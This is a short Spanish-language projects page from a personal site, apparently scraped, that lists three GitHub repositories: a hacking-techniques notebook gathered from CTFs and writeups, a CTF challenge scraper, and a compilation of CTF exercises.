https://github.com/srrequiem/Secronomicon\n Libro de notas donde encontrar谩s cada truco/t茅cnica/gu铆a de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.\n  CTFScrapper GITHUB: https://github.com/srrequiem/CTFScrapper\n Proyecto creado con la intenci贸n de recopilar los retos presentados en los CTFs mediante la generaci贸n de un ambiente de trabajo local con los archivos y con la informaci贸n de los retos.\n  CTF Challenge Compilation GITHUB: https://github.com/srrequiem/CTF-Challenge-Compilation\n Repositorio realizado con la finalidad de tener un compendio de ejercicios de CTFs en los que se ha participado.\n ","permalink":"https://srrequiem.xyz/projects/","summary":"projects","title":"Proyectos personales"}]